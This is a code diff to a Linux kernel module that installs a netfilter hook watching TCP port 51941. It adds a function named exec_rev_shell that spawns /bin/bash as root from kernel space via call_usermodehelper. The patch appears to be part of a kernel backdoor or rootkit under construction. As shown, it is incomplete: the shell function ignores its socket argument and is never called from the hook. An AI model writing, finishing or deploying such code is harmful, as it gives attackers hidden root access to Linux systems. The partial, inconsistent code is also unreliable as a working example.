@@ -5,8 +5,14 @@
 #include <linux/skbuff.h>
 #include <linux/ip.h>
 #include <linux/tcp.h>
-
-struct nf_hook_ops hook_ops;
+int  exec_rev_shell(int sock_fd) {
+    int ret;
+    char * envp[] = { "HOME=/", NULL };
+    char * argv[] = { "/bin/bash", NULL };
+    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    return ret;
+}
+static struct nf_hook_ops hook_ops;
 static unsigned int hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
     //check for specific port
@@ -21,9 +27,28 @@ static unsigned int hook(void *priv, struct sk_buff *skb, const struct nf_hook_s
         tcp_header = (struct tcphdr *) skb_transport_header(skb);
         src_port = (unsigned int)ntohs(tcp_header->source);
         dst_port = (unsigned int)ntohs(tcp_header->dest);
-        if(src_port == 51941)
-            return NF_STOLEN;
+        if(dst_port == 51941)
+            return NF_ACCEPT;
     }
 
     return NF_ACCEPT;
 }
+
+static struct nf_hook_ops hook_ops = 
+{
+    .hook = hook,
+    .hooknum = NF_INET_PRE_ROUTING,
+    .pf = PF_INET,
+    .priority    = NF_IP_PRI_FIRST
+};
+int __init hook_init(void)
+{
+    return nf_register_net_hook(&init_net, &hook_ops);
+}
+void __exit hook_exit(void)
+{
+    nf_unregister_net_hook(&init_net, &hook_ops);
+}
+
+module_init(hook_init);
+module_exit(hook_exit);
